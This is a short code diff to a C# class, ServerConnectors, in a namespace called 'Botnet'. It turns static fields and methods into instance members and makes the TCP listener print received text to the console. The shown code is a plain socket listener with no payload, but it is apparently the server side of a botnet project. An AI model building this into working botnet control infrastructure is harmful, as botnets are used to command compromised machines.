@@ -8,11 +8,11 @@ using System.Threading.Tasks;
 
 namespace Botnet
 {
-    public class ServerConnectors
+    class ServerConnectors
     {
-        public static string status;
-        public static IPAddress iPAddress;
-        public static int port;
+        public string status;
+        public IPAddress iPAddress;
+        public int port;
 
         public ServerConnectors(IPAddress ipadd, int p)
         {
@@ -20,7 +20,7 @@ namespace Botnet
             port = p;
         }
 
-        public static void ListenAndReceiveData() 
+        public void ListenAndReceiveData() 
         {
             Socket ss = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             IPAddress ipaddr = iPAddress;
@@ -50,7 +50,7 @@ namespace Botnet
                         }
                     }
 
-                    status = "Text received : {0}" + data;
+                    Console.WriteLine("Text received : " + data);
                 }
             }
 
